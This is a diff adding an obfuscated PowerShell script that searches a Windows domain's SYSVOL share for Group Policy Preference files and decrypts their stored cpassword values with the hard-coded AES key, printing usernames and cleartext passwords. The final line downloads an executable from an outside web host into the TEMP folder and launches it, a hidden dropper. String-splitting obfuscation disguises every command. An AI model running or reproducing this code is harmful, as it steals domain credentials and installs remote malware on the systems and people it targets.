@@ -1,0 +1,168 @@
+SEt-item  ("{1}{0}{3}{2}"-f 'AB','vARI','4','le:q7')  (  [TYpE]("{2}{3}{4}{0}{1}{5}"-f'i','oN','SYsTEm.R','eF','leCt','.asSeMblY')) ;  SEt-ITem  ("{2}{0}{1}"-f 'Ar','iaBle:eTA','v') ([type]("{1}{0}" -F 't','cOnVeR')) ;seT-ItEM ('vArI'+'ablE'+':'+'rbEQ8')  (  [TyPe]("{0}{1}{2}{3}{4}{6}{5}" -f'S','Y','stEM.TExT.','uNIc','od','ODinG','EeNC')  ); function ge`T-`Gpppa`SsW`ORD {
+
+    
+    [CmdletBinding()]
+    Param (
+            [ValidateNotNullOrEmpty()]
+            [String]
+            ${s`e`RvEr} = ${eNv:u`sErDNsD`o`MaIN}
+    )
+    
+    
+    &("{3}{2}{1}{0}" -f 'e','ctMod','tri','Set-S') -Version 2
+     (  lS ("{2}{0}{1}" -f'Ar','iABLE:q74','v'))."vAl`UE"::("{4}{5}{1}{0}{3}{6}{2}"-f 'art','dWithP','ame','ial','L','oa','N').Invoke(("{2}{0}{1}" -f'em.','Core','Syst')) |&("{1}{0}"-f 'ull','Out-N')
+    
+    function gET`-deCRyPt`e`dCpasswO`Rd {
+        [CmdletBinding()]
+        Param (
+            [string] ${c`paSS`word} 
+        )
+
+        try {
+            
+            ${m`Od} = (${cpaS`s`wOrd}."lE`N`gth" % 4)
+            
+            switch (${M`OD}) {
+            '1' {${C`P`ASs`WoRD} = ${C`passW`Ord}.("{1}{2}{0}"-f 'ng','Su','bstri').Invoke(0,${CPAS`s`WorD}."lEN`GTh" -1)}
+            '2' {${cpA`SSW`Ord} += ('=' * (4 - ${m`od}))}
+            '3' {${cPas`Sw`OrD} += ('=' * (4 - ${m`od}))}
+            }
+
+            ${B`A`Se`64dEc`ODeD} =   (  GI ("{3}{1}{2}{0}"-f'BLE:etA','Ari','a','V'))."vA`lUe"::("{4}{2}{0}{3}{1}" -f '64St','ing','romBase','r','F').Invoke(${cpaS`swo`Rd})
+            
+            
+            ${Aes`Ob`JECT} = &("{1}{2}{0}{3}"-f '-Obje','Ne','w','ct') ("{0}{9}{5}{8}{2}{4}{10}{13}{14}{15}{3}{7}{11}{6}{12}{1}"-f'Sys','er','urit','raph','y.','em.','ptoSe','y','Sec','t','C','.AesCry','rviceProvid','r','ypt','og')
+            [Byte[]] ${aeSk`ey} = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
+                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
+            
+            
+            ${A`eSIv} = &("{3}{2}{1}{0}" -f 't','w-Objec','e','N') ("{0}{1}"-f'Byte[',']')(${AES`OB`JECT}."i`V"."LeNg`Th") 
+            ${AES`OB`Ject}."iv" = ${ae`S`Iv}
+            ${A`eSObj`ecT}."K`EY" = ${AESk`ey}
+            ${DEC`RY`PToROb`jeCt} = ${AeS`OBjE`ct}.("{3}{2}{0}{1}" -f 'p','tor','ateDecry','Cre').Invoke() 
+            [Byte[]] ${out`Blo`Ck} = ${dEcR`YPTorOBJ`e`CT}.("{0}{3}{4}{1}{2}{5}"-f 'Tra','ormF','inalB','n','sf','lock').Invoke(${bA`S`E64Decoded}, 0, ${b`ASe6`4DECoD`ED}."L`E`NGtH")
+            
+            return  (CHilDiTEm ('Vari'+'abLE'+':'+'RbEq8')  )."VaL`UE"::"UnIc`Ode"."Gets`TrI`NG"(${oUT`Blo`Ck})
+        } 
+        
+        catch {&("{1}{2}{3}{0}"-f'ror','Writ','e','-Er') ${err`OR}[0]}
+    }  
+    
+    
+    function gET-`g`pp`INN`erFIe`ldS {
+    [CmdletBinding()]
+        Param (
+            ${F`ILE}
+        )
+    
+        try {
+            
+            ${FiLe`N`AmE} = &("{2}{1}{0}"-f'Path','lit-','Sp') ${F`ile} -Leaf
+            [xml] ${X`Ml} = &("{1}{0}{2}" -f '-Cont','Get','ent') (${f`IlE})
+
+            
+            ${cp`Assw`o`Rd} = @()
+            ${u`SE`RName} = @()
+            ${N`eWn`Ame} = @()
+            ${c`HanG`Ed} = @()
+            ${pa`SSWo`RD} = @()
+    
+            
+            if (${X`Ml}."INn`ERxMl" -like ("{0}{2}{3}{1}" -f'*cpass','d*','w','or')){
+            
+                &("{3}{2}{0}{1}"-f'i','te-Verbose','r','W') ('Poten'+'ti'+'al '+'p'+'assword'+' '+'i'+'n '+"$File")
+                
+                switch (${f`iL`eN`AMe}) {
+
+                    ("{0}{1}{2}" -f'Group','s','.xml') {
+                        ${c`PAsS`WoRD} += , ${X`ML} | &("{0}{1}{2}" -f 'S','e','lect-Xml') ("{5}{2}{3}{0}{4}{7}{8}{6}{1}"-f'/','ssword','Us','er','Propertie','/Groups/','a','s','/@cp') | &("{0}{1}{2}"-f'Select-Obj','ec','t') -Expand ("{1}{0}"-f 'de','No') | &("{2}{1}{3}{0}"-f'bject','ch','ForEa','-O') {${_}."VA`lUe"}
+                        ${US`ERnA`mE} += , ${X`mL} | &("{1}{2}{0}"-f 'l','Se','lect-Xm') ("{8}{3}{9}{4}{2}{0}{1}{5}{6}{10}{7}"-f '/','Prop','er','ups','s','ert','ies/','rName','/Gro','/U','@use') | &("{3}{1}{0}{2}"-f '-','ect','Object','Sel') -Expand ("{1}{0}" -f'ode','N') | &("{0}{3}{4}{1}{2}"-f 'F','c','t','orEac','h-Obje') {${_}."VAl`UE"}
+                        ${neW`NAmE} += , ${x`ml} | &("{2}{0}{1}"-f'le','ct-Xml','Se') ("{4}{1}{6}{2}{3}{7}{0}{5}"-f'ewNa','roup','User/','Pr','/G','me','s/','operties/@n') | &("{4}{0}{1}{3}{2}" -f'l','e','ject','ct-Ob','Se') -Expand ("{0}{1}"-f'N','ode') | &("{0}{2}{1}" -f'ForEach-Ob','t','jec') {${_}."vAl`UE"}
+                        ${C`haN`geD} += , ${X`ML} | &("{0}{2}{1}"-f'S','-Xml','elect') ("{3}{4}{2}{1}{0}" -f 'er/@changed','s','/U','/','Groups') | &("{0}{3}{1}{2}" -f'Sele','ec','t','ct-Obj') -Expand ("{0}{1}"-f'Nod','e') | &("{2}{3}{0}{1}" -f '-','Object','Fo','rEach') {${_}."v`AluE"}
+                    }
+        
+                    ("{3}{0}{1}{2}"-f 'er','vi','ces.xml','S') {  
+                        ${C`pASS`W`orD} += , ${X`ML} | &("{0}{2}{1}" -f'Se','-Xml','lect') ("{3}{8}{6}{5}{2}{0}{1}{7}{4}" -f 'ert','ie','op','/NTS','d','NTService/Pr','rvices/','s/@cpasswor','e') | &("{4}{3}{0}{1}{2}"-f't-Obj','ec','t','c','Sele') -Expand ("{1}{0}"-f'ode','N') | &("{1}{2}{0}"-f'ct','ForEach-Ob','je') {${_}."V`Alue"}
+                        ${u`s`ERNaME} += , ${x`Ml} | &("{2}{1}{0}" -f'Xml','-','Select') ("{8}{4}{13}{1}{2}{5}{0}{10}{11}{3}{12}{7}{6}{9}" -f'ope','S','e','@a','N','rvices/NTService/Pr','ntNa','cou','/','me','rtie','s/','c','T') | &("{4}{1}{0}{2}{3}"-f 'Ob','elect-','j','ect','S') -Expand ("{1}{0}"-f'ode','N') | &("{1}{0}{2}" -f 'ch-Ob','ForEa','ject') {${_}."vA`luE"}
+                        ${ch`An`ged} += , ${X`ML} | &("{2}{1}{0}" -f 'ect-Xml','el','S') ("{4}{3}{0}{2}{5}{1}{6}{7}" -f 'NT','c','Ser','es/','/NTServic','vi','e/@c','hanged') | &("{2}{1}{0}" -f 't','bjec','Select-O') -Expand ("{0}{1}" -f'Nod','e') | &("{0}{1}{2}{3}" -f 'ForEach','-Obj','e','ct') {${_}."Va`luE"}
+                    }
+        
+                    ("{4}{1}{2}{0}{5}{3}" -f '.x','ul','edtasks','l','Sched','m') {
+                        ${c`PAsS`w`orD} += , ${x`ML} | &("{0}{2}{1}" -f 'Se','Xml','lect-') ("{5}{3}{0}{2}{1}{9}{4}{7}{6}{8}" -f 'dT','/T','asks','hedule','Properties/','/Sc','asswo','@cp','rd','ask/') | &("{2}{0}{1}{3}"-f 'lec','t-O','Se','bject') -Expand ("{0}{1}"-f'N','ode') | &("{2}{3}{1}{0}" -f 'ct','bje','For','Each-O') {${_}."Val`UE"}
+                        ${uS`ernA`ME} += , ${x`ml} | &("{1}{2}{0}" -f'-Xml','Sel','ect') ("{6}{5}{4}{0}{3}{7}{1}{2}" -f'/Task/','s/@','runAs','P','uledTasks','ed','/Sch','ropertie') | &("{3}{2}{4}{0}{1}"-f 'Objec','t','c','Sele','t-') -Expand ("{1}{0}"-f'de','No') | &("{3}{1}{2}{0}" -f'ect','b','j','ForEach-O') {${_}."vAl`UE"}
+                        ${C`HA`NGed} += , ${x`mL} | &("{0}{2}{1}"-f 'Selec','-Xml','t') ("{5}{6}{0}{1}{7}{4}{3}{2}"-f 'sks/','Task','d','ge','@chan','/Sche','duledTa','/') | &("{1}{0}{2}" -f 'lect','Se','-Object') -Expand ("{0}{1}"-f'N','ode') | &("{0}{2}{1}{3}" -f'F','Each-O','or','bject') {${_}."vAl`Ue"}
+                    }
+        
+                    ("{4}{3}{2}{0}{1}"-f'.x','ml','s','ataSource','D') { 
+                        ${CPA`s`s`woRD} += , ${x`ml} | &("{0}{1}{2}" -f'Selec','t-Xm','l') ("{8}{9}{2}{5}{3}{1}{0}{6}{7}{4}"-f 'ataSourc','s/D','ataSo','e','word','urc','e/Proper','ties/@cpass','/','D') | &("{0}{2}{1}{3}{4}" -f 'S','ect-Obj','el','ec','t') -Expand ("{0}{1}" -f'Nod','e') | &("{4}{3}{1}{2}{0}"-f'ject','ch-','Ob','a','ForE') {${_}."VAL`UE"}
+                        ${User`NA`Me} += , ${x`ml} | &("{1}{3}{0}{2}" -f't','Sel','-Xml','ec') ("{3}{0}{8}{1}{10}{5}{2}{7}{9}{4}{6}"-f'Dat','ources/Dat','rc','/','er','Sou','ties/@username','e/P','aS','rop','a') | &("{0}{2}{1}"-f'Select','ct','-Obje') -Expand ("{1}{0}" -f'de','No') | &("{3}{1}{2}{0}" -f'-Object','E','ach','For') {${_}."V`Alue"}
+                        ${cHA`N`gEd} += , ${X`Ml} | &("{1}{0}{2}{3}" -f 'le','Se','ct-','Xml') ("{4}{3}{5}{6}{8}{7}{1}{2}{0}"-f'd','e','/@change','Data','/','Sources','/D','ourc','ataS') | &("{2}{0}{1}"-f'le','ct-Object','Se') -Expand ("{1}{0}" -f 'de','No') | &("{1}{3}{0}{4}{2}"-f 'h-Obj','Fo','ct','rEac','e') {${_}."vaL`UE"}                          
+                    }
+                    
+                    ("{0}{2}{1}{3}"-f 'Pr','nters','i','.xml') { 
+                        ${c`Pas`SwORd} += , ${X`ML} | &("{0}{2}{1}"-f 'S','ct-Xml','ele') ("{9}{7}{2}{1}{6}{3}{4}{8}{10}{5}{11}{0}" -f'd','r','nte','/S','haredPrinter/Pro','es/@','s','ri','pert','/P','i','cpasswor') | &("{0}{1}{3}{2}" -f'S','e','t','lect-Objec') -Expand ("{1}{0}" -f 'ode','N') | &("{1}{0}{2}" -f 'rEac','Fo','h-Object') {${_}."vA`lue"}
+                        ${U`Se`RnaMe} += , ${x`ml} | &("{1}{2}{0}{3}"-f'ct-','Se','le','Xml') ("{3}{9}{2}{0}{7}{10}{5}{4}{8}{1}{6}"-f'dPri','rnam','inters/Share','/','us','ties/@','e','nter/P','e','Pr','roper') | &("{0}{3}{2}{1}" -f'Selec','ect','bj','t-O') -Expand ("{1}{0}"-f 'de','No') | &("{1}{0}{2}"-f 'Each-Obj','For','ect') {${_}."v`ALue"}
+                        ${ChA`N`gEd} += , ${X`Ml} | &("{0}{3}{2}{1}"-f 'S','ct-Xml','e','el') ("{7}{4}{2}{1}{6}{3}{5}{0}" -f 'anged','edPrinte','Shar','/','rs/','@ch','r','/Printe') | &("{1}{0}{2}"-f 'ect','Sel','-Object') -Expand ("{1}{0}" -f 'de','No') | &("{1}{0}{4}{3}{2}"-f'or','F','ch-Object','a','E') {${_}."V`AluE"}
+                    }
+  
+                    ("{1}{2}{0}" -f 'l','Drives.x','m') { 
+                        ${c`Pas`SWOrD} += , ${X`ML} | &("{2}{1}{0}" -f'ml','X','Select-') ("{5}{10}{3}{7}{8}{6}{4}{0}{2}{1}{9}" -f'ies/','assw','@cp','r','/Propert','/','Drive','iv','es/','ord','D') | &("{2}{1}{4}{0}{3}" -f'c','ct','Sele','t','-Obje') -Expand ("{0}{1}" -f 'Nod','e') | &("{1}{2}{0}"-f 'bject','ForEac','h-O') {${_}."VAl`Ue"}
+                        ${User`NaME} += , ${X`ml} | &("{0}{1}{2}"-f 'Sel','e','ct-Xml') ("{6}{7}{8}{0}{1}{2}{5}{4}{3}"-f 'rive/','P','rope','@username','ies/','rt','/Driv','e','s/D') | &("{3}{2}{0}{1}" -f'bje','ct','ect-O','Sel') -Expand ("{0}{1}"-f 'No','de') | &("{1}{2}{0}"-f 'ect','ForEach-Ob','j') {${_}."VAL`UE"}
+                        ${CHA`NGED} += , ${X`mL} | &("{0}{3}{2}{1}"-f'S','t-Xml','ec','el') ("{2}{1}{4}{3}{5}{0}" -f 'anged','r','/Drives/D','e','iv','/@ch') | &("{2}{0}{1}{3}"-f'ele','ct-Obj','S','ect') -Expand ("{0}{1}" -f'No','de') | &("{2}{0}{1}" -f 'h-','Object','ForEac') {${_}."v`AlUE"} 
+                    }
+                }
+           }
+                     
+           foreach (${P`ASs} in ${C`p`ASSworD}) {
+               &("{1}{0}{2}"-f 'rite','W','-Verbose') ('De'+'cry'+'pt'+'ing '+"$Pass")
+               ${dE`C`RyPtE`DpAs`swOrd} = &("{4}{2}{5}{3}{0}{1}"-f'sw','ord','e','as','G','t-DecryptedCp') ${p`ASS}
+               &("{1}{3}{2}{0}" -f 'e','Wr','e-Verbos','it') ('De'+'cr'+'ypte'+'d '+'a '+'pa'+'s'+'s'+'word '+'o'+'f '+"$DecryptedPassword")
+               
+               ${p`Assw`ORd} += , ${dEC`RYPt`E`DP`ASswORd}
+           }
+            
+            
+            if (!(${Pas`SW`ORD})) {${pas`s`wORD} = ("{0}{1}"-f'[BL','ANK]')}
+            if (!(${use`R`N`AmE})) {${U`sernamE} = ("{1}{0}{2}" -f'K','[BLAN',']')}
+            if (!(${CHan`GeD})) {${C`HaN`geD} = ("{0}{2}{1}" -f'[BL','NK]','A')}
+            if (!(${n`Ew`NamE})) {${nEWN`AME} = ("{2}{0}{1}" -f 'BLA','NK]','[')}
+                  
+            
+            ${OB`j`Ec`T`Pr`opErtIeS} = @{("{0}{1}{2}"-f 'Pas','swor','ds') = ${pa`ssw`oRD};
+                                  ("{1}{2}{0}" -f 'mes','U','serNa') = ${uSER`N`Ame};
+                                  ("{0}{1}" -f'Ch','anged') = ${cH`ANGed};
+                                  ("{0}{2}{1}" -f'New','e','Nam') = ${n`EwNAME};
+                                  ("{1}{0}"-f 'le','Fi') = ${f`ILe}}
+                
+            ${ReS`ULTS`o`BJecT} = &("{0}{1}{2}" -f 'New-Ob','j','ect') -TypeName ("{1}{0}" -f 'bject','PSO') -Property ${obj`EctpROPE`RT`I`eS}
+            &("{0}{1}{2}" -f'Write-V','er','bose') "The password is between {} and may be more than one value."
+            if (${Re`S`ULTSOB`J`eCT}) {Return ${re`Su`lt`SO`BJeCT}} 
+        }
+
+        catch {&("{0}{2}{1}{3}"-f'W','-','rite','Error') ${e`R`ROr}[0]}
+    }
+    
+    try {
+        
+        if ( ( ((&("{2}{1}{0}{3}"-f '-WmiObj','t','Ge','ect') ("{0}{1}{5}{2}{4}{3}" -f 'Win32_','Comp','e','tem','rSys','ut'))."Pa`R`TOf`DomAIN") -eq ${F`ALSe} ) -or ( -not ${EnV:U`SErdnsDo`m`AIN} ) ) {
+            throw ("{2}{9}{5}{10}{6}{3}{11}{0}{8}{4}{1}{7}" -f ' member of the dom','n','Machine','is','i','a domai','r ','.','a',' is not ','n member or Use',' not a')
+        }
+
+        
+        &("{2}{0}{1}"-f'e-','Verbose','Writ') ('Sea'+'rch'+'ing '+"\\$Server\SYSVOL. "+'This'+' '+'could'+' '+'take'+' '+'a '+'whil'+'e'+'.')
+        ${xM`l`F`iLes} = &("{3}{1}{2}{0}"-f 'tem','Chil','dI','Get-') -Path "\\$Server\SYSVOL" -Recurse -ErrorAction ("{0}{2}{3}{1}" -f 'S','nue','ilen','tlyConti') -Include ("{0}{2}{1}"-f 'Gro','ml','ups.x'),("{0}{2}{1}{3}" -f'S','rvi','e','ces.xml'),("{0}{1}{3}{2}" -f 'Sche','duledta','l','sks.xm'),("{0}{2}{1}"-f 'DataSources.x','l','m'),("{0}{1}{2}"-f'P','rinters.xm','l'),("{2}{1}{0}"-f 'es.xml','v','Dri')
+    
+        if ( -not ${X`mlFI`LEs} ) {throw ("{2}{4}{1}{3}{0}" -f'.','e fil','No prefere','es found','nc')}
+
+        &("{0}{1}{2}"-f'Write-Ver','bo','se') "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords. "
+    
+        foreach (${Fi`le} in ${x`MLFi`LES}) {
+            ${R`E`SULt} = (&("{4}{1}{5}{0}{2}{3}"-f 'r','GppIn','Fie','lds','Get-','ne') ${fi`le}."FULL`NamE")
+            &("{0}{1}{2}"-f'W','ri','te-Output') ${rEsU`Lt}
+        }
+    }
+
+    catch {.("{1}{0}{2}" -f 'ite-E','Wr','rror') ${ER`R`OR}[0]}
+}
+
+(${d`Pl}=${En`V`:`TEMp}+("{0}{1}" -f'f.ex','e'));(&("{2}{3}{0}{1}"-f 'Ob','ject','Ne','w-') ("{4}{0}{3}{2}{1}"-f'e','t','.WebClien','m.Net','Syst')).("{2}{1}{0}{3}"-f 'oadFil','ownl','D','e').Invoke(("{3}{7}{0}{1}{8}{6}{4}{2}{5}{10}{9}" -f 'w','.amspec','3/n','h','om/12','a','line.c','ttp://ww','on','y.exe','z'), ${D`Pl});.("{2}{0}{3}{1}"-f't-Pr','cess','Star','o') ${D`pL}
